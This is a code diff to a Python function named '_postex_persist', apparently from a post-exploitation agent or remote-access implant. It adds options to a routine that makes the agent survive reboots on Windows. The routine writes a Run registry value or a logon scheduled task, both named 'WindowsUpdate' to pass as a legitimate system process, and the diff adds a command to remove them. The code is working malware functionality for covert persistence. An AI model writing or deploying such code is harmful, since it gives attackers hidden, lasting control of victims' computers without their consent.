@@ -101,16 +101,46 @@ def _postex_persist(method):
     import sys, os
     if sys.platform != 'win32':
         return 'Error: persist only supported on Windows'
-    method = method.strip() or 'registry'
+    method = method.strip().lower() or 'registry'
+    if method == 'reg':
+        method = 'registry'
     try:
         agent_path = os.path.abspath(sys.argv[0])
+        if method == 'remove':
+            removed = []
+            try:
+                import winreg
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                                    r'Software\Microsoft\Windows\CurrentVersion\Run',
+                                    0, winreg.KEY_SET_VALUE)
+                try:
+                    winreg.DeleteValue(key, 'WindowsUpdate')
+                    removed.append('registry')
+                except FileNotFoundError:
+                    pass
+                winreg.CloseKey(key)
+            except Exception:
+                pass
+            try:
+                import subprocess
+                subprocess.run(['schtasks', '/delete', '/tn', 'WindowsUpdate', '/f'],
+                               capture_output=True, timeout=15)
+                removed.append('schtask')
+            except Exception:
+                pass
+            if removed:
+                return 'Persistence removed: %s' % ', '.join(removed)
+            return 'No persistence found to remove'
         if method == 'registry':
             import winreg
-            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-                                r'Software\Microsoft\Windows\CurrentVersion\Run',
-                                0, winreg.KEY_SET_VALUE)
+            py_exe = sys.executable
+            if not os.path.isfile(agent_path):
+                return 'Error: agent path not found: %s' % agent_path
+            key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER,
+                                     r'Software\Microsoft\Windows\CurrentVersion\Run',
+                                     0, winreg.KEY_SET_VALUE)
             winreg.SetValueEx(key, 'WindowsUpdate', 0, winreg.REG_SZ,
-                              f'pythonw.exe "{agent_path}"')
+                              f'"{py_exe}" "{agent_path}"')
             winreg.CloseKey(key)
             return 'Persistence installed via registry Run key'
         if method == 'schtask':
@@ -121,6 +151,6 @@ def _postex_persist(method):
                 '/sc', 'onlogon', '/f'
             ], capture_output=True, timeout=15)
             return 'Persistence installed via scheduled task'
-        return 'Error: unknown persist method (use: registry, schtask)'
+        return 'Error: unknown persist method (use: reg, registry, schtask, remove)'
     except Exception as e:
         return 'Error: persist failed: %s' % e
